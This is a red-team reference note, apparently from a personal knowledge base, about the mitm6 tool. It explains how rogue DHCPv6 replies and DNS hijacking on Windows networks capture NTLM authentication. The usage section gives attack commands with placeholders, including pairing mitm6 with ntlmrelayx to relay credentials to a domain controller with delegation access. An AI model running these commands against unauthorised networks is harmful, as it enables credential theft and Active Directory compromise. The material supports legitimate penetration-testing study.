---
title: mitm6
aliases: ["mitm6", "IPv6 MITM"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "Fox-IT / Dirk-jan Mollema"
source_url: "https://github.com/dirkjanm/mitm6"
verified: true
related: ["[[WPAD and IPv6 (mitm6) Poisoning]]", "[[NTLM Relay]]", "[[ntlmrelayx]]", "[[Responder]]"]
created: 2026-06-07
updated: 2026-06-07
---

# mitm6

> [!summary] One-liner
> An IPv6 MITM tool that abuses Windows' preference for IPv6 — sends rogue DHCPv6 replies to become the default DNS server, then serves malicious DNS responses to redirect traffic for NTLM capture/relay.

## How it works
1. Windows clients periodically send DHCPv6 solicitations (even on IPv4-only networks).
2. mitm6 replies with a DHCPv6 response, setting the attacker as the **primary DNS server**.
3. When victims make DNS queries, mitm6 responds with attacker-controlled IPs.
4. Victims connect to the attacker's services → NTLM auth is captured or relayed.

## Usage
```bash
# Basic (target a specific domain)
sudo mitm6 -d <DOMAIN>

# Pair with ntlmrelayx for relay
sudo mitm6 -d <DOMAIN>
# In another terminal:
ntlmrelayx.py -t ldaps://<DC_IP> -wh wpad.<DOMAIN> --delegate-access

# Target specific hosts only
sudo mitm6 -d <DOMAIN> -hw <VICTIM_HOSTNAME>
```

## Typical attack chain
mitm6 → DHCPv6 poisoning → DNS hijack → WPAD proxy auth or SMB/LDAP redirect → [[ntlmrelayx]] captures NTLM → relays to LDAP/SMB/AD CS.

## Related
- Attack technique: [[WPAD and IPv6 (mitm6) Poisoning]].
- Relay: [[NTLM Relay]], [[ntlmrelayx]].
- Complementary: [[Responder]] (LLMNR/NBT-NS), [[Inveigh]].
